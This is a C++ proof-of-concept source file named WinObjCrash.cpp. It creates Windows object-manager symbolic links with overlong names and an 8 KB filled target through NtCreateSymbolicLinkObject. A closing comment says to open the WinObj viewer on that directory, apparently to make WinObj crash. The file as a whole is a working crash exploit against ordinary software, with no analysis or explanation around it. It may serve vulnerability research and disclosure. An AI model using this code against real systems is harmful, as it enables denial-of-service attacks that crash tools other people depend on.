// WinObjCrash.cpp : Defines the entry point for the console application.
//

#include "stdafx.h"
#include "windows.h"
#include "stdio.h"
#include "time.h"

#include "Header.h"


void WinObjCrash1(wchar_t* wName,wchar_t wData)
{
	ulong pid = GetCurrentProcessId();
	ulong SessionId = 0;
	BOOL bSess = ProcessIdToSessionId(pid,&SessionId);
	printf("Session id: %X\r\n",SessionId);

	wchar_t wSessionId[0x20]={0};
	_ultow(SessionId,wSessionId,10);
	printf("Session id: %s\r\n",wSessionId);

	wchar_t* pTarget = (wchar_t*)VirtualAlloc(0,0x2000,MEM_COMMIT,PAGE_READWRITE);

	


	wchar_t wSymName[0x200] = {0};
	wcscpy(wSymName,L"\\Sessions\\");
	wcscat(wSymName,wSessionId);
	wcscat(wSymName,L"\\BaseNamedObjects\\");
	wcscat(wSymName,wName);

	wprintf(L"Sym: %s\r\n",wSymName);

	_UNICODE_STRING uniSymName = {0};
	uniSymName.Length = wcslen(wSymName) * 2;
	uniSymName.MaxLength = uniSymName.Length + 2;
	uniSymName.Buffer = wSymName;


	_OBJECT_ATTRIBUTES ObjAttr = {sizeof(ObjAttr)};
	ObjAttr.Attributes = OBJ_CASE_INSENSITIVE;
	ObjAttr.ObjectName = &uniSymName;


	
	wmemset(pTarget,wData,(0x2000/2)-1);
	wprintf(L"Target: %s\r\n",pTarget);


	wchar_t* wTarget = pTarget;

	_UNICODE_STRING uniTarget = {0};
	uniTarget.Length = wcslen(wTarget) * 2;
	uniTarget.MaxLength = uniTarget.Length + 2;
	uniTarget.Buffer = wTarget;

	HANDLE hNewSym = 0;

	int ret = NtCreateSymbolicLinkObject(&hNewSym,GENERIC_ALL,&ObjAttr,&uniTarget);
	printf("NtCreateSymbolicLinkObject, ret: %X\r\n",ret);
	//if(ret == 0) getchar();



	VirtualFree(pTarget,0,MEM_RELEASE);
}

int _tmain(int argc, _TCHAR* argv[])
{
    WinObjCrash1(L"namenamenamenamenamenamenamenamenamenamenamenamenamenamenamenamenamenamenamenamenamenamenamenamenamenamenamenamenamenamenamenamenamenamenamenamenamenamenamenamenamenamenamenamenamenamenamenamenamenamenamenamenamenamenamenamenamenamenamenamenamenamenamenamenamenamenamenamenamenamenamenamenamenamenamenamenamenamenamenamenamenamenamenamenamenamenamenamenamenamenamenamenamenamenamenameXXX",L'A');
	WinObjCrash1(L"namenamenamenamenamenamenamenamenamenamenamenamenamenamenamenamenamenamenamenamenamenamenamenamenamenamenamenamenamenamenamenamenamenamenamenamenamenamenamenamenamenamenamenamenamenamenamenamenamenamenamenamenamenamenamenamenamenamenamenamenamenamenamenamenamenamenamenamenamenamenamenamenamenamenamenamenamenamenamenamenamenamenamenamenamenamenamenamenamenamenamenamenamenamenamenameYYY",L'B');
	
	Sleep(-1);//Now run WinObj and go to \Sessions\1\BaseNamedObjects\
	return 0;
}

